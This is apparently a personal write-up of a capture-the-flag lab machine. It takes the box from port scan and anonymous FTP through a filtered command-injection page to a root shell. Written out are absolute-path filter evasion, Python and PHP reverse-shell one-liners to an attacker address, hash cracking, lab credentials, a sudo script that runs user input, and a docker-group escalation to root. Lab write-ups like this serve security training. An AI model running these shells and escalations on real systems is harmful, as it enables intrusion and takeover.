</br> Starting with a basic scan as always...
  
</br> nmap -p- -T5 10.10.254.13 -v
</br> 
</br> ports 21, 22, 80 shown open
</br> 
</br> map  21,22,80 -T3 -A 10.10.254.13 -v
</br> 
</br> PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
</br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
</br>|_-rw-r--r--    1 1001     1001           90 Oct 03  2020 note.txt
</br>| ftp-syst: 
</br>|   STAT: 
</br>| FTP server status:
</br>|      Connected to ::ffff:10.10.228.90
</br>|      Logged in as ftp
</br>|      TYPE: ASCII
</br>|      No session bandwidth limit
</br>|      Session timeout in seconds is 300
</br>|      Control connection is plain text
</br>|      Data connections will be plain text
</br>|      At session startup, client count was 1
</br>|      vsFTPd 3.0.3 - secure, fast, stable
</br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</br> 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</br>|_http-favicon: Unknown favicon MD5: 7EEEA719D1DF55D478C68D9886707F17
</br>MAC Address: 02:A3:5F:57:89:27 (Unknown)
</br>
</br>Need to use the name "ftp" for the anonymous login, default pass being: Anonymous
</br>
![anongetnote3](https://github.com/user-attachments/assets/10b01cdc-8bf4-4789-81fb-04747483df78)
</br>
</br>from ftp, we find a file 
</br>note.txt ? Here's the contents:
```
Anurodh told me that there is some filtering on strings being put in the command -- Apaar
```

</br>Well, I'm going to run the dir-buster in the background while looking around on the site itself

```
wfuzz -c -f sub-fighter -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 31  http://10.10.254.13/FUZZ```

Hunting for top level domains, with the error message found to be 31 words long, so nix those...
```

</br>Let's look around on the site...
</br>Maybe take note of possible names if brute-forcing looks like a way to break in later. Angel Di Maria?
![reconOnSiteChill1](https://github.com/user-attachments/assets/abb2d4db-4513-4bf9-9599-345d1443bddf)


</br>The info at the bottom is dummy text... no osint skimming there

![noActualemailOrOsintDataToEnumerate](https://github.com/user-attachments/assets/3923261e-c5b1-42ec-bde7-63c79fccc75b)
</br>
</br>links on webpage are just dummies, but there might be other sub-directories, given it's not a one-page structure

![linksDeadMaybeDirEnum](https://github.com/user-attachments/assets/ae06a39b-b288-4c2b-a5d1-a6ea8bc1da71)

</br>css and js files also imply more than a single-page structure. There are resources that must be stored somewhere for the server to display them.
![thereAreCssFilesDirEnumValid](https://github.com/user-attachments/assets/7167b1e4-9b20-4ebe-9db2-de2bfff94419)

</br>investigate the javascript file, but there are no paths or anything in the code I can use
![jsFileFond](https://github.com/user-attachments/assets/55e212de-f2c2-481b-9246-44c2346832ed)

</br>nothing useful...
![noPathingCallsSoProbNotTheWay](https://github.com/user-attachments/assets/90e62cf4-1a09-46d2-b220-75509df03391)


</br>The directory fuzzing reveals /secret as a page...
![whileScanningInterestingHit](https://github.com/user-attachments/assets/ef8ed063-1c6b-4d32-9983-b2cea4aab6aa)

</br>huh, a tad explicit... command execution through injection into a text field?
![wellThatsBootleg](https://github.com/user-attachments/assets/3d04c1b3-97f9-490f-9e9d-448d175e8ae7)


</br>we can try injecting some different commands to look around
![vectorOfStuff](https://github.com/user-attachments/assets/459a8dec-e3ae-4e60-929c-a3f8691eabdc)

</br>I guess I'm www-data. So if I assume this is like a command-line, and i am one user, I'd want to see what has sudo permissions here, maybe. 

</br>sudo -l
![sudolEnumeration](https://github.com/user-attachments/assets/658520a8-76d2-42b2-ad8b-7952138b3f7d)


</br>/home/apaar/.helpline.sh

![erwgergheh](https://github.com/user-attachments/assets/adc89db4-e714-4165-8b1d-9ee95516c344)

</br>Um, I can't interact with this further... not from this injection point at least...
</br>which doesn't look so interesting on its own...
 </br>I wonder if we can modify it ....  (it was waste of time attempting to modify through here, since I don't have a bash session so I can't edit the file. I also can't see the file's structure, so this is just info disclosure at this point.)

</br>looking up absolute paths to binary commands instead of the aliases like "ls"
</br>running "ls" will trigger a silly screen, though in the screencap below I'm trying to cat out the contents of that .sh file found before. Seems a filter is triggering this...

![thereIsSomeKindOfFiltering](https://github.com/user-attachments/assets/3a5e23f7-e281-4261-9a03-bab310f48a26)


</br>try and use binary path evasion tech. to see what users we got in /etc/passwd
</br>`/bin/ls /etc/passwd`

![wbieurgberwgerg](https://github.com/user-attachments/assets/4e5b9a3c-0d71-4f6f-b89d-cf7043c1dd72)

</br>well we got the names: aurick, anurodh, apaar...
</br>odd, I didn't see Aurick in the note mentioned before.

</br>Try using pathing to python to get a rev shell...
</br>but where is the normal aboslute path to python? 
</br>/usr/bin/python `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.197.81",1984));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
</br>
</br>nope... doesn't work

</br>How about php?
</br>(*Note: pathing begins with a "/" so make sure it starts with "/usr", the wrong syntax cost me some hair being pulled out)

```
/usr/bin/php -r '$sock=fsockopen("10.10.197.81", 1984);exec("sh <&3 >&3 2>&3");'
```

</br>first run netcat on the target port (1984) and then execute, and it'll catch a basic shell. sudo -l here confirms that .sh file is around here...

![canConfirmSudoBitSetGood](https://github.com/user-attachments/assets/7feb6d33-1c86-4c63-9062-4d39a388a8a6)


</br>navigating around, I try and read some local files, but permission is denied.
![wbieurgberwgerg](https://github.com/user-attachments/assets/ec79396a-4563-46e7-aabd-f9609918c1b8)

</br>I can get the key from ssh

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC3BzOCWTm3aFsN/RKd4n4tBT71A+vJYONyyrDDj59Pv8lnVTtxi1/VI2Nb/op1nHUcuz1tYMJDMew2kkb+5CX6uiYfnryzD4OQoQUhC4tMSmopIoAi322Y5QSzSY1mSBESddCsn0C5VgE9in4PFl3rFv/k05hJDTXewmCh06vN7OAT5CLbf9lTtf1/Ga40pRixYFlV5owqZci697h17Is1K7RSFCQZwLGl29pLHPBwOpXkHpJqNqEl6Wgu+y0jvauNKzgIypD0EyojgX+1OPogSEr8WNuOc8w6wqQm6gTaAayPioIATTD/ECDBMJPLYN71t6Wdi5E+7R2GT6BIRFiGhTG65KXwXj6Vn7bj99BLSlaq2Qk6oUYpxhhkaE5koPKCJHb9zBsrGEUHTOMFjKhCypQCtjG9noW2jzm+/beqKcEZINQEQfzQFIGKdH0ypGfCCvD6YFUg7lcqQQH5Zd+9a95/5WyUE0XkNzJzU/yxfQ8RDB2In/ZptDYNBFoHXfM= root@ubuntu
```

</br>put it into mykey.txt
</br>chmod 600 mykey.txt
</br>(make it executable)

</br>`ssh -i mykey.txt apaar@10.10.234.37`

</br>You idiot, that's the public key, so of course ssh is still going to ask for a password...

</br>Changing approach to look around more...
</br>well, the index.php is what's running that searchbar page. We can see the blacklist of keywords now.
![keywordBlacklistOnThePHPpage](https://github.com/user-attachments/assets/970c6f9c-e951-4e04-a6cd-cd515f153e7c)


</br>scouting more...
</br>/var/www is normal, but html is the typical one, whereas "files" is something a person would have to manually add, not being part of the boilerplate.

![var_www_html_standard_but_files_is_not](https://github.com/user-attachments/assets/b5d8b903-f295-40c6-9586-a8c39df82f3c)

</br>within index.php there...
![leakCreds1](https://github.com/user-attachments/assets/ebbebe11-76ba-41fb-bebc-bd410d6323ca)

</br>!@m+her00+@db
</br>Where can I use these leaked creds though? Seems just to be to access this site's page, but I can already understand it's just a bootleg message from reading the html... it's showing a couple of images for flavor?
</br>It does not work for ssh or other users...

</br>within /var/www/files/images, we find a couple of images that are of a large filesize. 
</br>Maybe those images on that page were taunting us with more data in plain sight...
![getIt34](https://github.com/user-attachments/assets/3b07239d-52d6-40cd-9903-24016c842769)

</br>Download them using python to host a server, then wget to transfer files
![getemBoth342](https://github.com/user-attachments/assets/7dd0795b-a788-42cb-a50f-e86fe3f07bba)

</br>exiftool shows nothing interesting on them...
</br>Atk box doesn't have stegseek so I try to download it.

</br>This doesn't work because there's weird customization done to program files and paths for the VMs, so that's a bust...
</br>Reference for download; it really is a good tool if you got a custom machine to run it from
</br>https://github.com/RickdeJager/stegseek/releases
![screwYourLackOfTools](https://github.com/user-attachments/assets/8bd6e960-4d72-4e91-aedd-3c5d5dd8fccf)

</br>Find out, after much pain, that steghide is available


![autoconfigureGareer](https://github.com/user-attachments/assets/25352d2a-58b6-496e-9ff4-99c46ca7bd32)
</br>`steghide info img.jpg`
</br>(get  hidden details in img)
</br>`steghide extract -sf file.jpg`
</br>(get a zip file out of a hidden img data thing)
</br>
</br>unzip requires a password, so we gotta crack it, so make a hash of the zip file itself...

![zip2john](https://github.com/user-attachments/assets/8abc6083-ab6f-48fa-8eab-ef72a2c5cc24)


</br>`zip2john backup.zip > target.hash`
</br>gives us a hash that john can crack
</br>Send it to the ripper...
</br>`john target.hash --wordlist=/usr/share/wordlists/rockyou.txt`
</br>(crack the hash using rockyou as the word list reference)
</br>
</br>unzip says it requires a password, so use the pass1word we found there.
![itemFoundInBackupAsPhp](https://github.com/user-attachments/assets/7ac6d12f-15db-483a-a52e-e5d2035614a0)

</br>Hilit important part of the single file in that zip archive
![okUserPass48h234](https://github.com/user-attachments/assets/79e3b1ab-b521-434f-b748-414c348c7096)

</br>looks like creds, but encoded in base64.
</br>pass in base 64 IWQwbnRLbjB3bVlwQHNzdzByZA==
![dunnomypassword](https://github.com/user-attachments/assets/c937dd95-4484-42a4-8b86-f98deabcdf59)
</br>username: Anurodh
</br>pass: !d0ntKn0wmYp@ssw0rd

</br>well, dang, I can't run anything in my connection I got from the reverse shell because it's not a terminal...
![cantberunr23r23](https://github.com/user-attachments/assets/5b66a728-7469-4357-a806-378647d03e0f)

</br>upgrade the session to a tty shell with python
</br>`python3 -c 'import pty; pty.spawn("/bin/bash")'`


</br>sudo -l 
</br>remind ourselves of the file that had the superuser permissions that we saw from before...
</br>/home/apaar/.helpline.sh
```
#!/bin/bash

echo
echo "Welcome to helpdesk. Feel free to talk to anyone at any time!"
echo

read -p "Enter the person whom you want to talk with: " person

read -p "Hello user! I am $person,  Please enter your message: " msg

$msg 2>/dev/null

echo "Thank you for your precious time!"

```

</br>from the .helpline.sh file, analyzing it, we see that the msg gets passed as a command line argument. Name doesn't matter, so after it, we got code execution and should be able to spawn a /bin/bash session
</br>
</br>sudo -u apaar /home/apaar/.helpline.sh
</br>-->tells you to input a nams, so I just put "my foot" as the name, arbitrary.
</br>--> /bin/bash then enter, and that gave me a session 

</br>do the python upgrade for the shell to tty for this new instance
</br>`python3 -c 'import pty; pty.spawn("/bin/bash")'`
</br>(in the home/apaar directory is the user.txt flag file... )
</br>
</br>but we want to use the credentials of anurodh, which we can switch over to

![gtfobin](https://github.com/user-attachments/assets/6114d6ce-3e3b-482b-8446-6f5c2a51f659)


</br>discover anurodh is in a docker group
</br>
</br>GTFOfins for a shell from docker
</br>`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
</br>
</br>huh, the output is kinda wonky, but the terminal is working okay.
</br>That gives us a root terminal!
</br>
</br>cd into root and you can get the final flag.
